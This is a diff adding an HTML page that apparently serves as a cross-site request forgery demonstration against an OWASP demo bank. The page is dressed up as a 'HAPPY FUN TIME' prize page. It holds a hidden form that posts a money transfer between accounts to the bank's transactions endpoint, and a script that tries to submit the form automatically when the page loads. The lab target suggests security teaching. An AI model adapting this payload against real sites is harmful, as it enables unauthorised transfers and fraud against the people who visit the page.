@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>HAPPY FUN TIME!</title>
+
+        <style type="text/css">
+        body {
+        	padding: 20px 50px;
+        	font-family: "Comic Sans MS";
+        	font-size: 18px;
+    	}
+
+    	button {
+    		font-size: 1.5em;
+    		line-height: 2em;
+    		color: red;
+    	}
+        </style>
+    </head>
+    <body>
+
+    	<h1>THIS IS HAPPY FUN TIME!</h1>
+    	<p>Nothing weird is going on here! Seriously!!!1</p>
+
+    	<form method="post" action="http://owasp-bank.demo/transactions">
+    		<input type="hidden" name="sender_account_id" value="1" />
+    		<input type="hidden" name="receiver_account_id" value="5" />
+    		<input type="hidden" name="amount" value="100" />
+    		<input type="hidden" name="text" value="thankz sucker!" />
+    		<button>PRESS THIS BUTTON TO WIN FANCY PRIZE!</button>
+    	</form>
+
+    	<script type="text/javascript">
+
+    		document.form.submit();
+
+    	</script>
+
+    </body>
+</html>
